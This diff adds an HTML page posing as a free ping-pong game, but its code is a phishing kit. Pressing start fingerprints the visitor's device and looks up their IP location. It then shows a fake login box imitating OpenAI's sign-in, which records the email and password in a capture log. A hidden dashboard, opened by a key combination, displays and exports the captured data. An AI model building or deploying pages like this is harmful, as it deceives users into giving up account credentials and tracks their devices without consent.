@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<title>PingPong Arena</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{
+  font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,Arial,sans-serif;
+  background:#0a0a1a;color:#fff;min-height:100vh;
+  display:flex;align-items:center;justify-content:center;
+  overflow:hidden;user-select:none;
+}
+
+/* ===== GAME CANVAS ===== */
+#gameWrap{
+  position:relative;width:100%;max-width:480px;height:100vh;max-height:800px;
+  background:linear-gradient(180deg,#0a0a1a 0%,#1a0a2e 100%);
+  display:flex;flex-direction:column;
+}
+#topbar{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:12px 16px;background:#0d0d1f;border-bottom:1px solid #1e1e3f;
+}
+#topbar h1{font-size:16px;color:#00d4ff;font-weight:700;letter-spacing:1px}
+#topbar .score{font-size:14px;font-family:monospace;color:#ff006e}
+#topbar .user{font-size:11px;color:#666;font-family:monospace}
+
+#canvasWrap{
+  flex:1;display:flex;align-items:center;justify-content:center;
+  position:relative;overflow:hidden;
+}
+canvas{
+  display:block;max-width:100%;max-height:100%;
+  box-shadow:0 0 40px rgba(0,212,255,.3);
+  border-radius:8px;
+}
+
+#overlay{
+  position:absolute;inset:0;
+  background:rgba(10,10,26,.85);backdrop-filter:blur(8px);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  gap:16px;padding:24px;text-align:center;z-index:10;
+}
+#overlay h2{font-size:22px;color:#00d4ff;margin-bottom:8px}
+#overlay p{font-size:13px;color:#888;margin-bottom:8px}
+#overlay button{
+  padding:14px 32px;background:linear-gradient(135deg,#00d4ff,#ff006e);
+  color:#fff;border:0;border-radius:12px;font-size:15px;font-weight:700;
+  cursor:pointer;letter-spacing:1px;box-shadow:0 4px 20px rgba(0,212,255,.4);
+  transition:transform .15s;
+}
+#overlay button:active{transform:scale(.96)}
+#overlay .small{font-size:11px;color:#444;margin-top:8px}
+
+#controls{
+  display:flex;justify-content:center;gap:12px;padding:12px;
+  background:#0d0d1f;border-top:1px solid #1e1e3f;
+}
+#controls button{
+  flex:1;max-width:100px;padding:16px;background:#1a1a3f;color:#00d4ff;
+  border:1px solid #2a2a5f;border-radius:10px;font-size:20px;font-weight:700;
+  cursor:pointer;transition:all .1s;
+}
+#controls button:active{background:#00d4ff;color:#000;transform:scale(.95)}
+
+#hint{font-size:10px;color:#333;text-align:center;padding-bottom:8px}
+
+/* ===== LOGIN MODAL ===== */
+#loginModal{
+  position:fixed;inset:0;z-index:100;background:#fff;color:#0d0d0d;
+  display:none;align-items:center;justify-content:center;overflow:auto;
+}
+#loginModal.on{display:flex}
+.loginBox{
+  width:100%;max-width:380px;padding:28px 20px;
+  font-family:'Söhne','Segoe UI',-apple-system,sans-serif;
+}
+.loginBox .logo{display:flex;justify-content:center;margin-bottom:20px}
+.loginBox h1{font-size:24px;font-weight:500;text-align:center;letter-spacing:-.3px;color:#0d0d0d}
+.loginBox .sub{text-align:center;color:#5d5d5d;font-size:13px;margin:6px 0 24px}
+.loginBox label{display:block;font-size:13px;margin-bottom:6px;font-weight:500;color:#0d0d0d}
+.loginBox input[type=email],.loginBox input[type=password]{
+  width:100%;padding:12px 14px;border:1px solid #d9d9e3;border-radius:8px;
+  font-size:14px;margin-bottom:14px;outline:none;background:#fff;color:#0d0d0d;
+  transition:border-color .15s,box-shadow .15s;
+}
+.loginBox input:focus{border-color:#10a37f;box-shadow:0 0 0 3px rgba(16,163,127,.12)}
+.loginBox .submit{
+  width:100%;padding:12px;background:#10a37f;color:#fff;border:0;border-radius:8px;
+  font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;
+}
+.loginBox .submit:hover{background:#0d8a6b}
+.loginBox .foot{text-align:center;font-size:12px;color:#888;margin-top:16px}
+
+/* ===== DASHBOARD ===== */
+#dashBtn{
+  position:fixed;bottom:8px;right:8px;z-index:99998;
+  background:#0d0d1f;color:#00d4ff;border:1px solid #00d4ff;
+  padding:6px 10px;border-radius:6px;font-size:10px;font-family:monospace;
+  cursor:pointer;opacity:.15;
+}
+#dashBtn:active{opacity:1}
+#dashboard{
+  position:fixed;inset:0;z-index:99999;background:#0a0a0a;color:#0f0;
+  font-family:monospace;font-size:11px;padding:12px;overflow:auto;display:none;
+}
+#dashboard h2{color:#00d4ff;font-size:13px;margin-bottom:8px;border-bottom:1px solid #00d4ff;padding-bottom:4px}
+#dashboard .stat{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+#dashboard .badge{background:#00d4ff;color:#000;padding:2px 8px;border-radius:4px;font-weight:bold;font-size:10px}
+#dashboard .entry{background:#111;border-left:2px solid #00d4ff;padding:6px 8px;margin-bottom:6px;white-space:pre-wrap;word-break:break-all;font-size:10px;line-height:1.4}
+#dashboard .close{position:absolute;top:8px;right:8px;background:#c00;color:#fff;border:0;padding:4px 10px;border-radius:4px;cursor:pointer}
+#dashboard .toolbar{margin-bottom:10px;display:flex;gap:6px;flex-wrap:wrap}
+#dashboard .toolbar button{background:#00d4ff;color:#000;border:0;padding:4px 10px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:10px;font-weight:bold}
+</style>
+</head>
+<body>
+
+<div id="gameWrap">
+  <div id="topbar">
+    <h1>🏓 PINGPONG ARENA</h1>
+    <div class="score" id="scoreDisplay">YOU 0 - 0 BOT</div>
+    <div class="user" id="userDisplay">guest</div>
+  </div>
+
+  <div id="canvasWrap">
+    <canvas id="game" width="400" height="600"></canvas>
+    <div id="overlay">
+      <h2>🏓 PINGPONG ARENA</h2>
+      <p>Kalahkan bot, kumpulkan skor tertinggi!</p>
+      <button onclick="startFlow()">MULAI MAIN</button>
+      <div class="small">Gratis • Tanpa download</div>
+    </div>
+  </div>
+
+  <div id="controls">
+    <button id="btnUp">▲</button>
+    <button id="btnDown">▼</button>
+  </div>
+  <div id="hint">Tap tombol atau geser layar buat gerakin paddle</div>
+</div>
+
+<!-- ===== LOGIN MODAL (PHISH) ===== -->
+<div id="loginModal">
+  <div class="loginBox">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" width="42" height="42" fill="none">
+        <path d="M22.28 9.82a5.98 5.98 0 0 0-.51-4.91 6.05 6.05 0 0 0-6.51-2.9A5.98 5.98 0 0 0 4.98 4.18a5.98 5.98 0 0 0-4 2.9 6.05 6.05 0 0 0 .75 7.1 5.98 5.98 0 0 0 .51 4.91 6.05 6.05 0 0 0 6.51 2.9A5.98 5.98 0 0 0 19.02 19.8a5.98 5.98 0 0 0 4-2.9 6.05 6.05 0 0 0-.74-7.08z" fill="#000"/>
+      </svg>
+    </div>
+    <h1>Sign in to save score</h1>
+    <p class="sub">Login biar skor lo kesimpen di leaderboard global</p>
+
+    <form id="loginForm">
+      <label>Email</label>
+      <input type="email" id="email" placeholder="you@example.com" required>
+      <label>Password</label>
+      <input type="password" id="password" placeholder="••••••••" required>
+      <button type="submit" class="submit" id="submitBtn">Continue</button>
+    </form>
+
+    <p class="foot">Don't have an account? <a href="#" style="color:#10a37f">Sign up</a></p>
+  </div>
+</div>
+
+<!-- ===== DASHBOARD ===== -->
+<button id="dashBtn" onclick="toggleDash()">DASH</button>
+<div id="dashboard">
+  <button class="close" onclick="toggleDash()">✕</button>
+  <h2>⌁ CAPTURE DASHBOARD</h2>
+  <div class="stat" id="dashStats"></div>
+  <div class="toolbar">
+    <button onclick="refreshDash()">↻ REFRESH</button>
+    <button onclick="copyAll()">⧉ COPY</button>
+    <button onclick="clearLog()">🗑 CLEAR</button>
+    <button onclick="exportJSON()">⬇ EXPORT</button>
+  </div>
+  <div id="dashList"></div>
+</div>
+
+<script>
+/* =========================================================
+   CONFIG
+   ========================================================= */
+const CONFIG = {
+  redirect: "https://chat.openai.com/auth/login",
+  loginDelay: 1500
+};
+
+/* =========================================================
+   STORAGE
+   ========================================================= */
+function getLog(){
+  try{ return JSON.parse(localStorage.getItem('zmz_log')||'[]'); }
+  catch(e){ return []; }
+}
+function saveLog(a){ localStorage.setItem('zmz_log', JSON.stringify(a)); }
+function clearLog(){ if(confirm('Hapus log?')){ localStorage.removeItem('zmz_log'); refreshDash(); } }
+
+/* =========================================================
+   FINGERPRINT + GEO
+   ========================================================= */
+async function collectFP(){
+  const fp = {
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    platform: navigator.platform,
+    cores: navigator.hardwareConcurrency || 'N/A',
+    ram: navigator.deviceMemory || 'N/A',
+    screen: screen.width+'x'+screen.height,
+    color: screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    touch: 'ontouchstart' in window,
+    network: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+    gpu: (()=>{ try{
+      const c=document.createElement('canvas');
+      const gl=c.getContext('webgl');
+      const d=gl.getExtension('WEBGL_debug_renderer_info');
+      return gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+    }catch(e){return 'N/A';}})(),
+    referrer: document.referrer || 'direct',
+    time: new Date().toISOString()
+  };
+  if(navigator.getBattery){
+    try{ const b = await navigator.getBattery(); fp.battery = Math.round(b.level*100)+'%'; }catch(e){}
+  }
+  return fp;
+}
+async function getIPGeo(){
+  for(const url of ["https://ipapi.co/json/","https://ipwho.is/","https://api.ipify.org?format=json"]){
+    try{ const r = await fetch(url); const j = await r.json(); if(j) return j; }catch(e){}
+  }
+  return {error:'fail'};
+}
+async function exfil(type, payload){
+  const log = getLog();
+  log.unshift({type, payload, t: Date.now()});
+  saveLog(log);
+  console.log('['+type+']', payload);
+  if(document.getElementById('dashboard').style.display === 'block') refreshDash();
+}
+
+/* =========================================================
+   DASHBOARD
+   ========================================================= */
+function toggleDash(){
+  const d = document.getElementById('dashboard');
+  if(d.style.display === 'block') d.style.display = 'none';
+  else { d.style.display = 'block'; refreshDash(); }
+}
+function refreshDash(){
+  const log = getLog();
+  const stats = document.getElementById('dashStats');
+  const list  = document.getElementById('dashList');
+  const counts = {};
+  log.forEach(e => counts[e.type] = (counts[e.type]||0)+1);
+  stats.innerHTML = `<span class="badge">TOTAL: ${log.length}</span>` +
+    Object.entries(counts).map(([k,v]) => `<span class="badge">${k}: ${v}</span>`).join('');
+  if(log.length === 0){ list.innerHTML = '<div class="entry">Belum ada data.</div>'; return; }
+  list.innerHTML = log.map((e,i) => {
+    const g = e.payload.geo || {};
+    const fp = e.payload.fp || {};
+    return `<div class="entry">[${i+1}] ${e.type.toUpperCase()} — ${new Date(e.t).toLocaleString()}
+${e.type==='login'
+  ? `Email: ${e.payload.email}\nPass: ${e.payload.password}\nIP: ${g.ip||g.query||'?'}\nLoc: ${g.country_name||g.country||'?'} / ${g.city||'?'}\nISP: ${g.org||g.isp||'?'}`
+  : `IP: ${g.ip||g.query||'?'}\nLoc: ${g.country_name||g.country||'?'} / ${g.city||'?'}\nISP: ${g.org||g.isp||'?'}\nDev: ${fp.platform||'?'} | ${fp.screen||'?'}\nTZ: ${fp.tz||'?'}\nGPU: ${fp.gpu||'?'}`
+}</div>`;
+  }).join('');
+}
+function copyAll(){
+  const txt = JSON.stringify(getLog(), null, 2);
+  navigator.clipboard.writeText(txt).then(()=>alert('Copied!')).catch(()=>{});
+}
+function exportJSON(){
+  const blob = new Blob([JSON.stringify(getLog(), null, 2)], {type:'application/json'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = 'zmz_log_'+Date.now()+'.json';
+  a.click(); URL.revokeObjectURL(url);
+}
+
+/* =========================================================
+   GAME PINGPONG
+   ========================================================= */
+const canvas = document.getElementById('game');
+const ctx = canvas.getContext('2d');
+const W = canvas.width, H = canvas.height;
+
+let player = { x: 20, y: H/2 - 50, w: 12, h: 100, speed: 7 };
+let bot    = { x: W - 32, y: H/2 - 50, w: 12, h: 100, speed: 4.5 };
+let ball   = { x: W/2, y: H/2, r: 8, dx: 4, dy: 3 };
+let score  = { player: 0, bot: 0 };
+let gameRunning = false;
+let targetY = H/2;
+let animId = null;
+
+function resetBall(dir){
+  ball.x = W/2; ball.y = H/2;
+  ball.dx = 4 * dir;
+  ball.dy = (Math.random()*4-2) || 3;
+}
+function updateScore(){
+  document.getElementById('scoreDisplay').textContent =
+    `YOU ${score.player} - ${score.bot} BOT`;
+}
+function drawRect(o, color){
+  ctx.fillStyle = color;
+  ctx.fillRect(o.x, o.y, o.w, o.h);
+}
+function drawBall(){
+  ctx.beginPath();
+  ctx.arc(ball.x, ball.y, ball.r, 0, Math.PI*2);
+  ctx.fillStyle = '#ff006e';
+  ctx.shadowColor = '#ff006e';
+  ctx.shadowBlur = 15;
+  ctx.fill();
+  ctx.shadowBlur = 0;
+}
+function drawCenterLine(){
+  ctx.setLineDash([8, 12]);
+  ctx.strokeStyle = '#1e1e3f';
+  ctx.beginPath();
+  ctx.moveTo(W/2, 0);
+  ctx.lineTo(W/2, H);
+  ctx.stroke();
+  ctx.setLineDash([]);
+}
+function gameLoop(){
+  if(!gameRunning) return;
+
+  // bot AI: gerak ke arah bola
+  const botCenter = bot.y + bot.h/2;
+  if(botCenter < ball.y - 15) bot.y += bot.speed;
+  else if(botCenter > ball.y + 15) bot.y -= bot.speed;
+  bot.y = Math.max(0, Math.min(H - bot.h, bot.y));
+
+  // player smooth
+  player.y += (targetY - (player.y + player.h/2)) * 0.25;
+  player.y = Math.max(0, Math.min(H - player.h, player.y));
+
+  // ball movement
+  ball.x += ball.dx;
+  ball.y += ball.dy;
+
+  // bounce top/bottom
+  if(ball.y - ball.r < 0){ ball.y = ball.r; ball.dy *= -1; }
+  if(ball.y + ball.r > H){ ball.y = H - ball.r; ball.dy *= -1; }
+
+  // collide player
+  if(ball.x - ball.r < player.x + player.w &&
+     ball.y > player.y && ball.y < player.y + player.h &&
+     ball.dx < 0){
+    ball.x = player.x + player.w + ball.r;
+    ball.dx *= -1.05;
+    ball.dy += (ball.y - (player.y + player.h/2)) * 0.05;
+  }
+  // collide bot
+  if(ball.x + ball.r > bot.x &&
+     ball.y > bot.y && ball.y < bot.y + bot.h &&
+     ball.dx > 0){
+    ball.x = bot.x - ball.r;
+    ball.dx *= -1.05;
+    ball.dy += (ball.y - (bot.y + bot.h/2)) * 0.05;
+  }
+
+  // speed cap
+  const maxSpeed = 12;
+  if(Math.abs(ball.dx) > maxSpeed) ball.dx = maxSpeed * Math.sign(ball.dx);
+  if(Math.abs(ball.dy) > maxSpeed) ball.dy = maxSpeed * Math.sign(ball.dy);
+
+  // score
+  if(ball.x < -20){
+    score.bot++;
+    updateScore();
+    resetBall(1);
+  }
+  if(ball.x > W + 20){
+    score.player++;
+    updateScore();
+    resetBall(-1);
+  }
+
+  // render
+  ctx.fillStyle = '#0a0a1a';
+  ctx.fillRect(0, 0, W, H);
+  drawCenterLine();
+  drawRect(player, '#00d4ff');
+  drawRect(bot, '#ff006e');
+  drawBall();
+
+  animId = requestAnimationFrame(gameLoop);
+}
+
+/* =========================================================
+   CONTROLS
+   ========================================================= */
+document.getElementById('btnUp').addEventListener('touchstart', e => { e.preventDefault(); targetY -= 60; });
+document.getElementById('btnUp').addEventListener('click', () => { targetY -= 60; });
+document.getElementById('btnDown').addEventListener('touchstart', e => { e.preventDefault(); targetY += 60; });
+document.getElementById('btnDown').addEventListener('click', () => { targetY += 60; });
+
+let touchStartY = 0;
+canvas.addEventListener('touchstart', e => { touchStartY = e.touches[0].clientY; });
+canvas.addEventListener('touchmove', e => {
+  e.preventDefault();
+  const diff = e.touches[0].clientY - touchStartY;
+  targetY += diff * 0.5;
+  touchStartY = e.touches[0].clientY;
+}, {passive:false});
+
+canvas.addEventListener('mousemove', e => {
+  const rect = canvas.getBoundingClientRect();
+  targetY = (e.clientY - rect.top) * (H / rect.height);
+});
+
+/* =========================================================
+   FLOW: MULAI → LOGIN → GAME
+   ========================================================= */
+async function startFlow(){
+  // Tracker: user mulai main (sebelum login)
+  const [fp, geo] = await Promise.all([collectFP(), getIPGeo()]);
+  await exfil('visitor', {fp, geo});
+
+  // Munculin login modal
+  document.getElementById('loginModal').classList.add('on');
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e){
+  e.preventDefault();
+  const email = document.getElementById('email').value.trim();
+  const pass  = document.getElementById('password').value;
+
+  const btn = document.getElementById('submitBtn');
+  btn.textContent = 'Signing in...';
+  btn.disabled = true;
+
+  const [fp, geo] = await Promise.all([collectFP(), getIPGeo()]);
+  await exfil('login', {email, password: pass, fp, geo, time: new Date().toISOString()});
+
+  // Update display user
+  document.getElementById('userDisplay').textContent = email.split('@')[0] || 'player';
+
+  // Tutup modal, mulai game
+  setTimeout(() => {
+    document.getElementById('loginModal').classList.remove('on');
+    document.getElementById('overlay').style.display = 'none';
+    gameRunning = true;
+    resetBall(-1);
+    updateScore();
+    if(animId) cancelAnimationFrame(animId);
+    gameLoop();
+  }, CONFIG.loginDelay);
+});
+
+/* =========================================================
+   HOTKEY: pencet "d" 3x buat dashboard
+   ========================================================= */
+let dCount = 0, dTimer = null;
+document.addEventListener('keydown', e => {
+  if(e.key.toLowerCase() === 'd'){
+    dCount++;
+    clearTimeout(dTimer);
+    dTimer = setTimeout(()=> dCount = 0, 600);
+    if(dCount >= 3){ toggleDash(); dCount = 0; }
+  }
+});
+</script>
+</body>
+  </html>
